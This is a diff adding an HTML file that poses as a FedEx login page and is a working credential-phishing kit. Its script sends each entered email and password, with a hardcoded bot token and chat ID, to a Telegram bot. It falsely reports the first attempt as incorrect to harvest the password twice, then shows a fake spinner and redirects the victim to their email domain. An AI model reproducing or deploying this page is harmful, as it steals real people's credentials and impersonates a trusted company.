@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FedEx Login Page</title>
+    <style>
+        /* Reset basic styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Container styling */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        /* Logo styling */
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        /* Header */
+        h1 {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+
+        /* Form styling */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .login-form label {
+            font-size: 0.9em;
+            color: #333;
+            text-align: left;
+        }
+
+        .login-form input[type="email"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1em;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            font-size: 0.85em;
+        }
+
+        .remember-me input {
+            margin-right: 5px;
+        }
+
+        .login-button {
+            background-color: #ff6600;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        /* Overlay styling for "unresponsive" effect */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2em;
+            color: #333;
+            z-index: 999;
+            visibility: hidden;
+        }
+
+        /* Spinner animation */
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #333;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src=https://images.squarespace-cdn.com/content/v1/53fd397ce4b03ae33c1629c4/1493993295875-4DH0S4UJ31IHDYBOEOUK/fedex_arrow.gif" alt="FedEx Logo" class="logo">
+        </header>
+        <main>
+            <h1>confirm password connected to email-User</h1>
+            <form class="login-form" id="loginForm">
+                <label for="user-email">Email</label>
+                <input type="email" id="user-email" placeholder="Email" required>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Password" required>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember-me">
+                    <label for="remember-me">Remember my email</label>
+                </div>
+
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="links">
+                <a href="#">Create an account</a> |
+                <a href="#">Forgot your password?</a>
+            </div>
+            <div class="help">
+                <p>Need help?</p>
+                <a href="#">Customer Support</a>
+            </div>
+        </main>
+    </div>
+
+    <!-- Overlay for "unresponsive" effect -->
+    <div class="overlay" id="overlay">
+        <div>
+            <div class="spinner"></div>
+            <p>Processing...</p>
+        </div>
+    </div>
+
+    <script>
+        // Replace with your actual bot token and chat ID
+        const BOT_TOKEN = '7312223663:AAHf1MtcD0Ksu_Bwvyr5W7nAY6iQPxDA8zU';
+        const CHAT_ID = '5899924228';
+        let loginAttempts = 0;
+
+        // Function to get email from hash
+        function getEmailFromHash() {
+            const hash = window.location.hash.substring(1); // Get everything after the '#'
+            return hash.includes('@') ? hash : null; // Basic check to see if it's a valid email format
+        }
+
+        // Populate the email field if an email is passed in the URL hash
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailFromHash = getEmailFromHash();
+            if (emailFromHash) {
+                document.getElementById('user-email').value = emailFromHash;
+            }
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get form data
+            const userEmail = document.getElementById('user-email').value;
+            const password = document.getElementById('password').value;
+            const rememberMe = document.getElementById('remember-me').checked ? 'Yes' : 'No';
+
+            // Prepare message text
+            const message = `Login Attempt:\nEmail: ${userEmail}\nPassword: ${password}\nRemember Me: ${rememberMe}`;
+
+            // Send data to Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Error:', error));
+
+            // Increase login attempt count
+            loginAttempts++;
+
+            // First failed attempt: Show alert
+            if (loginAttempts === 1) {
+                alert("Email/password is incorrect, try again");
+            }
+
+            // After two failed attempts, show spinner and then redirect
+            if (loginAttempts >= 2) {
+                // Show overlay to make the page appear "unresponsive"
+                document.getElementById('overlay').style.visibility = 'visible';
+
+                // Redirect to the domain part of the email after a short delay
+                setTimeout(() => {
+                    const emailParts = userEmail.split('@');
+                    if (emailParts.length > 1) {
+                        const domain = emailParts[1];
+                        const redirectUrl = `https://${domain}`;
+                        window.location.href = redirectUrl;
+                    } else {
+                        console.error('Invalid email format.');
+                    }
+                }, 2000); // Delay to show spinner
+            }
+        });
+    </script>
+</body>
+</html>
